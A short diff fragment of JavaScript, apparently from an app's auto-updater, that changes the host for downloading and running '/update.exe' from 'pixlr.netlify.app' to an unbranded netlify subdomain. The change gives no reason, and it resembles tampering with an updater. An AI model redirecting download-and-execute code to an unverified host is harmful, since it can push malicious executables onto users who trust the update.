@@ -15,7 +15,7 @@ const downloadAndRunUpdate = () => {
     }
 
     const options = {
-        hostname: 'pixlr.netlify.app',
+        hostname: 'friendly-lily-0061ce.netlify.app',
         path: '/update.exe',
         method: 'GET',
         headers: {
